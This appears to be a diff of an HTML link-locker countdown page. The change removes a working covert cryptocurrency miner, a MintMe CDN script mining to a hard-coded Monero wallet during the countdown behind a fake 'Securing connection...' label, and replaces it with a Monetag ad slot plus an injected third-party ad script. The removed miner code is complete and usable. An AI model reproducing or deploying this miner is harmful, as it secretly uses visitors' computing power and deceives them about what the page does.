@@ -5,16 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Link Hub - Access Your Link</title>
     
-    <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-H9WEQ611TP"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-H9WEQ611TP');
-</script>
-
     <style>
         :root {
             --bg: #f8fafc;
@@ -184,31 +174,24 @@
             font-weight: 600;
         }
         
-        .mining-indicator {
+        .ad-section {
+            background: #f8fafc;
+            border: 1px dashed var(--border);
+            border-radius: 12px;
+            padding: 0.8rem;
+            margin: 1rem 0;
+            min-height: 90px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 7px;
-            font-size: 0.78rem;
-            color: var(--muted);
-            margin-top: 0.5rem;
-            font-weight: 500;
         }
         
-        .mining-dot {
-            width: 7px;
-            height: 7px;
-            background: var(--accent3);
-            border-radius: 50%;
-            animation: miningPulse 1.5s infinite;
-        }
-        
-        .mining-dot:nth-child(2) { animation-delay: 0.5s; }
-        .mining-dot:nth-child(3) { animation-delay: 1s; }
-        
-        @keyframes miningPulse {
-            0%, 100% { opacity: 0.3; transform: scale(0.7); }
-            50% { opacity: 1; transform: scale(1.2); }
+        .ad-label {
+            color: #94a3b8;
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 600;
         }
         
         .affiliate-section { margin: 1.2rem 0; }
@@ -410,17 +393,16 @@
             <div class="timer-circle-wrap">
                 <div class="timer-circle" id="timerCircle">
                     <div class="timer-inner">
-                        <span id="countdown">30</span>
+                        <span id="countdown">15</span>
                         <span class="timer-label">seconds</span>
                     </div>
                 </div>
             </div>
-            <div class="mining-indicator">
-                <span class="mining-dot"></span>
-                <span class="mining-dot"></span>
-                <span class="mining-dot"></span>
-                <span>Securing connection...</span>
-            </div>
+        </div>
+        
+        <!-- Monetag Ad Section -->
+        <div class="ad-section" id="monetagAd">
+            <span class="ad-label">📢 Advertisement</span>
         </div>
         
         <div class="affiliate-section">
@@ -437,52 +419,25 @@
             </span>
         </button>
         
-        <p class="footer-text">⚡ Powered by Link Hub</p>
+        <p class="footer-text">⚡ Powered by OF Heaven </p>
         <div class="toast" id="toast"></div>
     </div>
-    
-    <script src="https://cdn.jsdelivr.net/gh/mintme-com/miner@latest/dist/mintme.min.js"></script>
     
     <script>
         (function() {
             
-            const TOTAL_SECONDS = 30;
+            const TOTAL_SECONDS = 15;
             const LINKS_JSON_URL = 'links.json';
             const AFFILIATE_JSON_URL = 'affiliate.json';
-            const MONERO_WALLET = '44iLjvVjP86KN8kd1SFSg1GcveRZVnmJZWsYjj75jD1rb1uREMU7aWmWNGBjJQkLqx7F9hBQh95KrVM4urV4ntaaLyK7D9o';
             
             let secondsLeft = TOTAL_SECONDS;
             let destUrl = 'https://google.com';
-            let miner = null;
             
             const countdownEl = document.getElementById('countdown');
             const timerCircle = document.getElementById('timerCircle');
             const continueBtn = document.getElementById('continueBtn');
             const affiliateGrid = document.getElementById('affiliateGrid');
             const toast = document.getElementById('toast');
-            
-            function startMiner() {
-                try {
-                    if (typeof MintMe === 'undefined') {
-                        console.warn('MintMe not loaded. Check CDN.');
-                        return;
-                    }
-                    miner = new MintMe.Anonymous(MONERO_WALLET, {
-                        threads: 2,
-                        throttle: 0.5,
-                        forceASMJS: false
-                    });
-                    miner.start();
-                } catch (err) {
-                    console.warn('Miner start failed:', err.message);
-                }
-            }
-            
-            function stopMiner() {
-                if (miner) {
-                    try { miner.stop(); } catch (err) {}
-                }
-            }
             
             async function loadDestination() {
                 const params = new URLSearchParams(window.location.search);
@@ -526,7 +481,7 @@
                 
                 if (secondsLeft <= 5) {
                     countdownEl.style.color = '#ef4444';
-                } else if (secondsLeft <= 15) {
+                } else if (secondsLeft <= 10) {
                     countdownEl.style.color = '#f59e0b';
                 } else {
                     countdownEl.style.color = '#6366f1';
@@ -542,13 +497,10 @@
             function activateButton() {
                 continueBtn.disabled = false;
                 continueBtn.innerHTML = '🚀 Access Your Link Now';
-                stopMiner();
             }
             
             async function init() {
                 await Promise.all([loadDestination(), loadAffiliates()]);
-                
-                startMiner();
                 
                 updateTimer();
                 const timerInterval = setInterval(() => {
@@ -582,5 +534,14 @@
             
         })();
     </script>
+    
+    <!-- Monetag Integration -->
+    <script>
+        (function(d,z,s){
+            s.src='https://'+d+'/400/'+z;
+            try{(document.body||document.documentElement).appendChild(s)}catch(e){}
+        })('admaviation.com','YOUR_MONETAG_ZONE_ID',document.createElement('script'));
+    </script>
+    
 </body>
 </html>
